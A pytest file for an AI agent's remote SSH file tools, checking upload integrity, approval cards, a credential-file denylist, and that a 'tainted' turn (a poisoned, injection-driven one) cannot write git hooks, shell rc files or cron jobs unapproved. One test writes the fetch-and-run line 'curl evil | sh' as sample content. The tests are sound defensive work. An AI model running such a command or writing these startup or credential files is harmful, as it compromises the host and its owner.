"""The remote file tools, after an independent review: the upload that arrives short, the card that shows
the wrong file, the write that a poisoned turn aims at a startup file, and the denylist on the host.

Same two fake hosts as ``test_ssh_remote_files.py`` (a table, and the real ``sh`` in a temporary folder).
"""

from __future__ import annotations

import hashlib
from collections.abc import Sequence
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from chimera.api.manual_gate import ManualAllowances, ManualEditGate, ManualScope
from chimera.sandbox.base import SandboxResult
from chimera.tools import ssh_remote as remote
from chimera.tools.edit import ApplyPatchTool, EditBatchTool, EditFileTool
from chimera.tools.files import ReadFileTool, WriteFileTool
from chimera.tools.search import GlobTool, GrepTool
from chimera.tools.ssh_files import (
    RemoteApplyPatch,
    RemoteEditBatch,
    RemoteEditFile,
    RemoteFileTool,
    RemoteGlob,
    RemoteGrep,
    RemoteReadFile,
    RemoteWriteFile,
)
from chimera.tools.ssh_remote import RemoteFileError, clamp_limit, startup_reason
from tests.test_ssh_remote_files import ROOT, ScriptedHost, ShellHost, _host, needs_sh


def _scripted_with(path: str, text: str = "old\n") -> ScriptedHost:
    host = ScriptedHost()
    host.files[f"{ROOT}/{path}"] = text.encode()
    return host


# -- MEDIUM 1: an upload that arrives short is never moved into place ------------------------------


@needs_sh
def test_a_short_or_altered_upload_is_dropped_and_the_old_file_stays(tmp_path: Path) -> None:
    folder = tmp_path / "p"
    folder.mkdir()
    (folder / "keep.txt").write_text("old", encoding="utf-8")
    host = _host(folder)
    real = str(folder.resolve() / "keep.txt")
    sent = b"only half of the content"
    good = hashlib.sha256(sent).hexdigest()
    # ssh died mid-upload: the host's `cat` saw a clean EOF after FEWER bytes than the tool meant to send.
    short = host.run_script(remote.WRITE, [str(folder), real, str(len(sent) * 2), good], stdin=sent)
    assert short.exit_code == 101
    # Same length, other bytes: the hash catches what the count cannot.
    altered = host.run_script(remote.WRITE, [str(folder), real, str(len(sent)), hashlib.sha256(b"x").hexdigest()], stdin=sent)
    assert altered.exit_code == 101
    assert (folder / "keep.txt").read_text(encoding="utf-8") == "old"
    assert [p.name for p in folder.iterdir()] == ["keep.txt"]  # and no temp file left behind
    # The right count and hash go through.
    ok = host.run_script(remote.WRITE, [str(folder), real, str(len(sent)), good], stdin=sent)
    assert ok.exit_code == 0 and (folder / "keep.txt").read_bytes() == sent


@needs_sh
def test_the_tool_reports_an_incomplete_upload_as_an_error(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    folder = tmp_path / "p"
    folder.mkdir()
    (folder / "keep.txt").write_text("old", encoding="utf-8")
    host = _host(folder)
    real_run = host.run_script

    def cut(script: str, args: Sequence[str] = (), *, stdin: bytes | None = None, timeout: int = 60) -> SandboxResult:
        return real_run(script, args, stdin=(stdin or b"")[:3], timeout=timeout)  # the pipe closes early

    monkeypatch.setattr(host, "run_script", cut)
    out = RemoteWriteFile(WriteFileTool(folder), host).run(path="keep.txt", content="a long new content")
    assert out.startswith("error:") and "incomplete" in out
    assert (folder / "keep.txt").read_text(encoding="utf-8") == "old"


def test_the_write_timeout_grows_with_the_size_of_the_content() -> None:
    seen: list[int] = []

    class Timed(ScriptedHost):
        def run_script(self, script: str, args: Sequence[str] = (), *, stdin: bytes | None = None, timeout: int = 60) -> SandboxResult:
            if script == remote.WRITE:
                seen.append(timeout)
            return super().run_script(script, args, stdin=stdin, timeout=timeout)

    host = Timed()
    tool = RemoteWriteFile(WriteFileTool(Path.cwd()), host)
    tool.run(path="small.txt", content="x")
    tool.run(path="big.txt", content="x" * (5 * 1024 * 1024))
    assert seen[0] == 60 and seen[1] == 60 + 20


# -- MEDIUM 2: the Manual card shows the REMOTE file ------------------------------------------------


def _card_for(tool: RemoteFileTool, workspace: Path, **args: Any) -> SimpleNamespace:
    from chimera.governance.ledger import WORKSPACE_WRITERS

    asked: list[Any] = []

    def ask(question: Any, action: str) -> bool:
        asked.append(question)
        return False

    scope = ManualScope(ManualAllowances(), lambda: "s", lambda: True)
    ManualEditGate(tool, workspace, scope, ask, WORKSPACE_WRITERS[tool.name]).run(**args)
    (question,) = asked
    return question


def test_the_manual_card_for_a_remote_write_diffs_the_remote_file_and_names_the_host(tmp_path: Path) -> None:
    (tmp_path / "app.py").write_text("LOCAL FILE\nnot the one\n", encoding="utf-8")  # same relative path, other machine
    host = _scripted_with("app.py", "remote line\nsecond\n")
    tool = RemoteWriteFile(WriteFileTool(tmp_path), host)
    card = _card_for(tool, tmp_path, path="app.py", content="remote line\nchanged\n")
    assert "write_file on web1" in card.action and "app.py" in card.action
    assert "-second" in card.action and "+changed" in card.action
    assert "LOCAL FILE" not in card.action and "not the one" not in card.action
    assert "web1" in card.reason and "not in the workspace" in card.reason
    assert card.allow_key.startswith("write_file@web1:")  # an allowance for this host's file, not a local one


def test_the_manual_card_previews_edit_patch_and_batch_from_the_host(tmp_path: Path) -> None:
    host = _scripted_with("a.txt", "one\ntwo\n")
    edit = _card_for(RemoteEditFile(EditFileTool(tmp_path), host), tmp_path, path="a.txt", old="two", new="2")
    assert "-two" in edit.action and "+2" in edit.action
    patch = "<<<<<<< SEARCH\none\n=======\n1\n>>>>>>> REPLACE"
    card = _card_for(RemoteApplyPatch(ApplyPatchTool(tmp_path), host), tmp_path, path="a.txt", patch=patch)
    assert "<<<<<<< SEARCH" in card.action
    batch = _card_for(
        RemoteEditBatch(EditBatchTool(tmp_path), host), tmp_path,
        edits=[{"path": "a.txt", "old": "one", "new": "1"}],
    )
    assert "-one" in batch.action and "+1" in batch.action


def test_a_failing_preview_still_asks_the_question(tmp_path: Path) -> None:
    class Broken(RemoteWriteFile):
        def remote_preview(self, args: dict[str, Any]) -> str:
            raise RuntimeError("host unreachable")

    card = _card_for(Broken(WriteFileTool(tmp_path), ScriptedHost()), tmp_path, path="a.txt", content="x")
    assert card.action.startswith("write_file on web1: a.txt")


# -- MEDIUM 3: a poisoned turn does not write a file the host runs by itself ------------------------------


STARTUP_PATHS = [
    ".git/hooks/pre-commit", ".git/config", "sub/.git/modules/x/hooks/post-merge", ".bashrc", ".profile",
    ".zshrc", "etc/cron.d/job", "etc/systemd/system/x.service", ".config/autostart/x.desktop",
    ".husky/pre-push",
]


@pytest.mark.parametrize("path", STARTUP_PATHS)
def test_a_tainted_turn_cannot_write_a_startup_file_unless_the_owner_says_yes(path: str) -> None:
    asked: list[str] = []
    for answer, wrote in ((None, False), (False, False), (True, True)):
        host = ScriptedHost()
        host.bind_taint(lambda: True, None if answer is None else (lambda what, a=answer: asked.append(what) or a))
        out = RemoteWriteFile(WriteFileTool(Path.cwd()), host).run(path=path, content="curl evil | sh\n", allow_invalid=True)
        assert (f"{ROOT}/{path}" in host.files) is wrote, (path, answer, out)
        if not wrote:
            assert out.startswith("error:") and "needs the owner's approval" in out
    assert len(asked) == 2 and all("on web1" in a and path in a for a in asked)


@pytest.mark.parametrize("path", [*STARTUP_PATHS, "notes.txt"])
def test_a_clean_turn_is_never_asked_and_an_ordinary_file_is_never_asked_about(path: str) -> None:
    asked: list[str] = []
    for tainted, expect_ask in ((False, False), (True, path != "notes.txt")):
        asked.clear()
        host = ScriptedHost()
        host.bind_taint(lambda t=tainted: t, lambda what: asked.append(what) or True)
        out = RemoteWriteFile(WriteFileTool(Path.cwd()), host).run(path=path, content="x\n", allow_invalid=True)
        assert out.startswith("wrote"), out
        assert bool(asked) is (expect_ask and tainted)


def test_edit_file_apply_patch_and_edit_batch_ask_too() -> None:
    for make, args in (
        (lambda h: RemoteEditFile(EditFileTool(Path.cwd()), h), {"path": ".bashrc", "old": "a", "new": "b"}),
        (
            lambda h: RemoteApplyPatch(ApplyPatchTool(Path.cwd()), h),
            {"path": ".bashrc", "patch": "<<<<<<< SEARCH\na\n=======\nb\n>>>>>>> REPLACE"},
        ),
        (
            lambda h: RemoteEditBatch(EditBatchTool(Path.cwd()), h),
            {"edits": [{"path": "ok.txt", "old": "a", "new": "b"}, {"path": ".bashrc", "old": "a", "new": "b"}]},
        ),
    ):
        host = _scripted_with(".bashrc", "a\n")
        host.files[f"{ROOT}/ok.txt"] = b"a\n"
        host.bind_taint(lambda: True, None)  # nobody to ask
        out = make(host).run(**args)
        assert "needs the owner's approval" in out, out
        assert host.files[f"{ROOT}/.bashrc"] == b"a\n" and host.files[f"{ROOT}/ok.txt"] == b"a\n"  # nothing written at all


def test_the_startup_reason_names_what_runs_the_file() -> None:
    assert startup_reason("/srv/app/.git/hooks/x", ".git/hooks/x") and startup_reason("/h/.bashrc", ".bashrc")
    assert startup_reason("/etc/cron.d/x", "x") and startup_reason("/srv/app/a", "a") is None
    assert startup_reason("/srv/app/.gitignore", ".gitignore") is None and startup_reason("/s/.git/HEAD", ".git/HEAD") is None


# -- LOW: the denylist on the host, framing, limits ---------------------------------------------------------


@needs_sh
@pytest.mark.parametrize(
    "path", [".aws/credentials", "x/.KUBE/config", ".Docker/config.json", ".BASH_HISTORY", "ID_RSA", "a/.ENV", "s.TFSTATE", ".SSH/k"]
)
def test_the_host_scripts_refuse_a_credential_even_when_python_did_not(tmp_path: Path, path: str) -> None:
    folder = tmp_path / "p"
    (folder / path).parent.mkdir(parents=True, exist_ok=True)
    (folder / path).write_text("SECRET", encoding="utf-8")
    host = _host(folder)
    root = str(folder.resolve())
    target = str(folder.resolve() / path)
    for script, extra in ((remote.READ, ["1000"]), (remote.WRITE, ["1", "0" * 64])):
        done = host.run_script(script, [root, target, *extra], stdin=b"x")
        assert done.exit_code == 102, (script[:20], path, done.stderr)
    assert (folder / path).read_text(encoding="utf-8") == "SECRET"
    plain = host.run_script(remote.READ, [root, str(folder.resolve()), "1000"])
    assert plain.exit_code == 93  # the root itself is a folder, not refused as a credential


@pytest.mark.parametrize(
    "path", [".aws/credentials", ".kube/config", ".docker/config.json", ".bash_history", "terraform.tfstate", "x.tfstate.backup", ".AWS/credentials"]
)
def test_the_extended_remote_denylist_is_refused_by_every_tool(path: str) -> None:
    host = _scripted_with(path, "SECRET")
    for tool in (
        RemoteReadFile(ReadFileTool(Path.cwd()), host),
        RemoteWriteFile(WriteFileTool(Path.cwd()), host),
        RemoteEditFile(EditFileTool(Path.cwd()), host),
    ):
        assert "credential file" in tool.run(path=path, content="x", old="a", new="b"), (type(tool).__name__, path)
    assert host.calls == []


@needs_sh
def test_a_login_banner_around_the_answer_cannot_corrupt_a_read(tmp_path: Path) -> None:
    folder = tmp_path / "p"
    folder.mkdir()
    (folder / "a.txt").write_text("exact content\n", encoding="utf-8")

    class Noisy(ShellHost):
        def run_script(self, script: str, args: Sequence[str] = (), *, stdin: bytes | None = None, timeout: int = 60) -> SandboxResult:
            done = super().run_script(script, args, stdin=stdin, timeout=timeout)
            if done.exit_code != 0:
                return done
            # An rc file that prints, before the command and after it (base64-looking text included).
            return SandboxResult(0, "Last login: QUJDRA==\nWelcome!\n" + done.stdout + "bye QUJDRA==\n", done.stderr)

    host = Noisy("web1", str(folder))
    assert RemoteReadFile(ReadFileTool(folder), host).run(path="a.txt") == "exact content\n"
    assert RemoteWriteFile(WriteFileTool(folder), host).run(path="b.txt", content="hi\n") == "wrote 3 chars to b.txt"
    assert RemoteReadFile(ReadFileTool(folder), host).run(path="b.txt") == "hi\n"


def test_an_answer_with_no_markers_is_an_error_not_a_guess() -> None:
    class Banner(ScriptedHost):
        def run_script(self, script: str, args: Sequence[str] = (), *, stdin: bytes | None = None, timeout: int = 60) -> SandboxResult:
            return SandboxResult(0, "this host prints a banner and nothing else\n")

    out = RemoteReadFile(ReadFileTool(Path.cwd()), Banner()).run(path="a.txt")
    assert out.startswith("error:") and "not recognised" in out


def test_a_read_that_is_not_strict_base64_is_refused() -> None:
    class Garbled(ScriptedHost):
        def run_script(self, script: str, args: Sequence[str] = (), *, stdin: bytes | None = None, timeout: int = 60) -> SandboxResult:
            if script == remote.READ:
                return SandboxResult(0, remote.MARK_BEGIN + "11\naGVsbG8*gd29ybGQ=\n" + remote.MARK_END)
            return super().run_script(script, args, stdin=stdin, timeout=timeout)

    host = Garbled()
    host.files[f"{ROOT}/a.txt"] = b"x"
    assert "could not be decoded" in RemoteReadFile(ReadFileTool(Path.cwd()), host).run(path="a.txt")


@pytest.mark.parametrize(("value", "expected"), [(None, 100), (0, 100), ("", 100), (5, 5), (-3, 1), (10**9, 1000), ("7", 7)])
def test_max_results_is_clamped(value: Any, expected: int) -> None:
    assert clamp_limit(value, 100) == expected


@needs_sh
def test_bad_limits_and_nul_bytes_are_clean_errors(tmp_path: Path) -> None:
    folder = tmp_path / "p"
    folder.mkdir()
    (folder / "a.txt").write_text("hello\n", encoding="utf-8")
    host = _host(folder)
    grep, glob = RemoteGrep(GrepTool(folder), host), RemoteGlob(GlobTool(folder), host)
    assert grep.run(pattern="hello", max_results="lots") == "error: max_results must be a whole number"
    assert glob.run(pattern="*.txt", max_results=[1]) == "error: max_results must be a whole number"
    assert grep.run(pattern="a\0b") == "error: pattern has a NUL byte, which cannot be sent to the host"
    assert grep.run(pattern="a", glob="*\0").startswith("error: glob has a NUL byte")
    assert glob.run(pattern="a\0").startswith("error: pattern has a NUL byte")
    assert grep.run(pattern="hello", max_results=-5).endswith("[stopped at 1 matches]")  # clamped to 1
    assert RemoteReadFile(ReadFileTool(folder), host).run(path="a\0b").startswith("error:")
    assert grep.run(pattern="hello", max_results=10**9) == "a.txt:1: hello"


@needs_sh
def test_grep_skips_credential_files_whatever_their_case(tmp_path: Path) -> None:
    folder = tmp_path / "p"
    (folder / ".AWS").mkdir(parents=True)
    for name in (".ENV", "ID_RSA", "Secrets.JSON", "Prod.PEM", ".AWS/credentials", "Terraform.TFState"):
        (folder / name).write_text("needle\n", encoding="utf-8")
    (folder / "ok.txt").write_text("needle\n", encoding="utf-8")
    assert RemoteGrep(GrepTool(folder), _host(folder)).run(pattern="needle") == "ok.txt:1: needle"


def test_remote_reads_and_grep_are_untrusted_output_and_the_rest_are_not() -> None:
    host = ScriptedHost()
    trusting = ReadFileTool(Path.cwd())  # the local default trusts the workspace
    assert trusting.untrusted_output is False
    assert RemoteReadFile(trusting, host).untrusted_output is True
    assert RemoteGrep(GrepTool(Path.cwd()), host).untrusted_output is True
    assert RemoteWriteFile(WriteFileTool(Path.cwd()), host).untrusted_output is False


# -- the ported edit tools answer as the local ones do ----------------------------------------------------------


@needs_sh
def test_apply_patch_answers_exactly_as_the_local_tool_does(tmp_path: Path) -> None:
    def build(folder: Path) -> None:
        folder.mkdir()
        (folder / "a.txt").write_bytes(b"one\r\ntwo\r\nthree\r\n")
        (folder / "b.bin").write_bytes(b"\xff\xfe")

    local, far = tmp_path / "local", tmp_path / "far"
    build(local)
    build(far)
    host = _host(far)

    def hunk(search: str, replace: str) -> str:
        return f"<<<<<<< SEARCH\n{search}\n=======\n{replace}\n>>>>>>> REPLACE\n"

    cases = [
        {"path": "a.txt", "patch": hunk("nope", "x")},
        {"path": "a.txt", "patch": hunk("t", "x")},  # ambiguous
        {"path": "a.txt", "patch": hunk("", "x")},
        {"path": "a.txt", "patch": "garbage"},
        {"path": "a.txt", "patch": hunk("one\ntwo", "A") + hunk("two\nthree", "B")},  # overlap
        {"path": "missing.txt", "patch": hunk("a", "b")},
        {"path": "a.txt", "patch": hunk("one", "1") + hunk("three", "3")},
        {"path": "b.bin", "patch": hunk("a", "b")},
    ]
    for case in cases:
        assert RemoteApplyPatch(ApplyPatchTool(far), host).run(**case) == ApplyPatchTool(local).run(**case), case
    assert (far / "a.txt").read_bytes() == (local / "a.txt").read_bytes() == b"1\r\ntwo\r\n3\r\n"


@needs_sh
def test_edit_batch_is_all_or_nothing_across_files_and_reports_like_the_local_one(tmp_path: Path) -> None:
    def build(folder: Path) -> None:
        folder.mkdir()
        (folder / "a.txt").write_text("alpha alpha\n", encoding="utf-8")
        (folder / "b.txt").write_text("beta\n", encoding="utf-8")
        (folder / ".env").write_text("K=v\n", encoding="utf-8")

    local, far = tmp_path / "local", tmp_path / "far"
    build(local)
    build(far)
    host = _host(far)
    remote_tool, local_tool = RemoteEditBatch(EditBatchTool(far), host), EditBatchTool(local)
    cases = [
        {"edits": []},
        {"edits": [{"path": "a.txt", "old": "alpha", "new": "A"}]},  # count mismatch: 2 occurrences, 1 expected
        {"edits": [{"path": "b.txt", "old": "beta", "new": "B"}, {"path": "a.txt", "old": "zzz", "new": "x"}]},
        {"edits": [{"path": "b.txt", "old": "beta", "new": "B"}, {"path": "gone.txt", "old": "a", "new": "x"}]},
        {"edits": [{"path": "a.txt", "old": "alpha", "new": "A", "count": "x"}]},
        {"edits": [{"path": "a.txt", "old": "alpha", "new": "A", "count": 2}, {"path": "b.txt", "old": "beta", "new": "B"}]},
    ]
    for case in cases:
        assert remote_tool.run(**case) == local_tool.run(**case), case
    # Two edits to one file compose, as locally; every file lands; the failed batches wrote nothing.
    assert (far / "a.txt").read_text(encoding="utf-8") == (local / "a.txt").read_text(encoding="utf-8") == "A A\n"
    assert (far / "b.txt").read_text(encoding="utf-8") == (local / "b.txt").read_text(encoding="utf-8") == "B\n"
    # And the one a path guard stops names the edit and writes nothing — not even the clean file before it.
    out = remote_tool.run(edits=[{"path": "b.txt", "old": "B", "new": "again"}, {"path": ".env", "old": "K", "new": "X"}])
    assert out.startswith("batch aborted, nothing written — edit 2 (.env): ") and "credential file" in out
    escape = remote_tool.run(edits=[{"path": "../x", "old": "a", "new": "b"}])
    assert "escapes" in escape and (far / "b.txt").read_text(encoding="utf-8") == "B\n"
    assert (far / ".env").read_text(encoding="utf-8") == "K=v\n"


# -- round 2 -------------------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path", [".gitconfig", ".bash_aliases", ".inputrc", ".config/git/config", "sub/.config/git/config", ".git/config"]
)
def test_more_files_the_host_runs_by_itself_are_startup_files(path: str) -> None:
    assert startup_reason(f"/h/{path}", path) is not None
    assert startup_reason("/h/other/config", "other/config") is None  # a `config` that is not git's


def test_every_remote_tool_marks_what_it_returns_as_outside_input_except_the_writers() -> None:
    from chimera.tools.ssh_files import RemoteListDir

    host = ScriptedHost()
    cwd = Path.cwd()
    untrusted = {
        cls.__name__: cls(tool, host).untrusted_output
        for cls, tool in (
            (RemoteReadFile, ReadFileTool(cwd)), (RemoteGrep, GrepTool(cwd)),
            (RemoteGlob, GlobTool(cwd)), (RemoteListDir, ReadFileTool(cwd)),
            (RemoteWriteFile, WriteFileTool(cwd)), (RemoteEditFile, EditFileTool(cwd)),
            (RemoteApplyPatch, ApplyPatchTool(cwd)), (RemoteEditBatch, EditBatchTool(cwd)),
        )
    }
    assert untrusted == {
        "RemoteReadFile": True, "RemoteGrep": True, "RemoteGlob": True, "RemoteListDir": True,
        "RemoteWriteFile": False, "RemoteEditFile": False, "RemoteApplyPatch": False, "RemoteEditBatch": False,
    }


@pytest.mark.parametrize("value", [1e999, float("inf"), float("nan"), [1], {"a": 1}])
def test_a_limit_that_is_not_a_finite_number_is_a_clean_error(value: Any) -> None:
    with pytest.raises(RemoteFileError, match="whole number"):
        clamp_limit(value, 100)


def test_the_read_window_survives_infinity_too() -> None:
    from chimera.tools.files import read_window

    for bad in (1e999, float("nan"), "x", [2]):
        assert read_window("a\nb\n", bad, None).startswith("error: ")
        assert read_window("a\nb\n", None, bad).startswith("error: ")
    assert read_window("a\nb\nc\n", 2, 1) == "b\n\n... [truncated, lines 2–2 of 3 shown; continue with start_line=3]"


def _reading(body: str) -> str:
    class Fake(ScriptedHost):
        def run_script(
            self, script: str, args: Sequence[str] = (), *, stdin: bytes | None = None, timeout: int = 60
        ) -> SandboxResult:
            if script == remote.READ:
                return SandboxResult(0, body)
            return super().run_script(script, args, stdin=stdin, timeout=timeout)

    host = Fake()
    host.files[f"{ROOT}/a.txt"] = b"x"
    return RemoteReadFile(ReadFileTool(Path.cwd()), host).run(path="a.txt")


def test_a_read_cut_short_or_the_wrong_size_is_refused() -> None:
    begin = "banner\n" + remote.MARK_BEGIN
    assert _reading(begin + "5\naGVsbG8=\n" + remote.MARK_END) == "hello"
    assert "cut short" in _reading(begin + "5\naGVsbG8=\n")  # no end marker: the connection dropped
    assert "decoded in full" in _reading(begin + "9\naGVsbG8=\n" + remote.MARK_END)  # size disagrees
    assert "decoded in full" in _reading(begin + "\naGVsbG8=\n" + remote.MARK_END)  # no size
    assert "decoded in full" in _reading(begin + "5\naGVsb\n" + remote.MARK_END)  # truncated base64


@needs_sh
def test_the_read_script_fails_when_base64_fails(tmp_path: Path) -> None:
    import os
    import subprocess

    folder = tmp_path / "p"
    folder.mkdir()
    (folder / "a.txt").write_text("hello", encoding="utf-8")
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    (bin_dir / "base64").write_text("#!/bin/sh\necho partial\nexit 1\n", encoding="utf-8")
    (bin_dir / "base64").chmod(0o755)
    root = str(folder.resolve())
    done = subprocess.run(
        ["sh", "-c", remote.READ, "sh", root, f"{root}/a.txt", "1000"], capture_output=True, text=True,
        env={**os.environ, "PATH": f"{bin_dir}:{os.environ['PATH']}"}, check=False,
    )
    assert done.returncode == 103 and remote.MARK_END not in done.stdout


def test_a_failed_batch_write_names_what_landed_what_may_have_and_what_was_not_attempted() -> None:
    class Flaky(ScriptedHost):
        def run_script(
            self, script: str, args: Sequence[str] = (), *, stdin: bytes | None = None, timeout: int = 60
        ) -> SandboxResult:
            if script == remote.WRITE and args[1].endswith("b.txt"):
                raise OSError("connection reset")  # not a RemoteFileError
            return super().run_script(script, args, stdin=stdin, timeout=timeout)

    host = Flaky()
    for name in ("a.txt", "b.txt", "c.txt"):
        host.files[f"{ROOT}/{name}"] = b"x\n"
    edits = [{"path": n, "old": "x", "new": "y"} for n in ("a.txt", "b.txt", "c.txt")]
    out = RemoteEditBatch(EditBatchTool(Path.cwd()), host).run(edits=edits)
    assert out.startswith("error: PARTIAL WRITE — connection reset.")
    assert "Already written: a.txt" in out and "Failed on: b.txt" in out
    assert "MAY OR MAY NOT have landed" in out and "Not attempted: c.txt" in out
    assert host.files[f"{ROOT}/a.txt"] == b"y\n" and host.files[f"{ROOT}/c.txt"] == b"x\n"


def test_an_infinite_count_is_a_clean_error_locally_and_remotely(tmp_path: Path) -> None:
    (tmp_path / "a.txt").write_text("x\n", encoding="utf-8")
    host = ScriptedHost()
    host.files[f"{ROOT}/a.txt"] = b"x\n"
    edits = [{"path": "a.txt", "old": "x", "new": "y", "count": 1e999}]
    want = "error: edit 1 has a non-integer 'count'"
    assert EditBatchTool(tmp_path).run(edits=edits) == want
    assert RemoteEditBatch(EditBatchTool(tmp_path), host).run(edits=edits) == want
    assert RemoteEditBatch.__doc__ and "edit_batch" in RemoteEditBatch.__doc__
